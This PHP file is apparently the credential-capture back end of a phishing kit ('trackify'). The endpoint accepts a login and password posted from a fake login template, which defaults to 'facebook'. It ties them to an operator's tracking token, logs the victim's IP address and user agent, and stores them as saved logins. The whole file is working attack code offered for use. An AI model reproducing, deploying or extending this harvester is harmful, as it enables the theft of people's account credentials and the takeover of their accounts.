<?php

declare(strict_types=1);

header('Content-Type: application/json; charset=UTF-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Cache-Control: no-store, no-cache, must-revalidate');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method']);

    exit;
}

require_once __DIR__ . '/trackify_capture.php';

$tid = isset($_POST['tid']) ? (string) $_POST['tid'] : '';
$userId = trackify_user_id_for_token($tid);
if ($userId === null) {
    echo json_encode(['ok' => false, 'error' => 'invalid_tid']);

    exit;
}

$login = isset($_POST['login']) ? (string) $_POST['login'] : '';
$password = isset($_POST['password']) ? (string) $_POST['password'] : '';
$template = isset($_POST['template']) ? (string) $_POST['template'] : 'facebook';

if ($login === '' && $password === '') {
    echo json_encode(['ok' => false, 'error' => 'empty']);

    exit;
}

$ip = (string) ($_SERVER['REMOTE_ADDR'] ?? '');
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = trim((string) $_SERVER['HTTP_CLIENT_IP']);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', (string) $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
}

$ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');

if (trackify_append_saved_login($userId, $login, $password, $template, $ip, $ua)) {
    echo json_encode(['ok' => true]);
} else {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'store']);
}
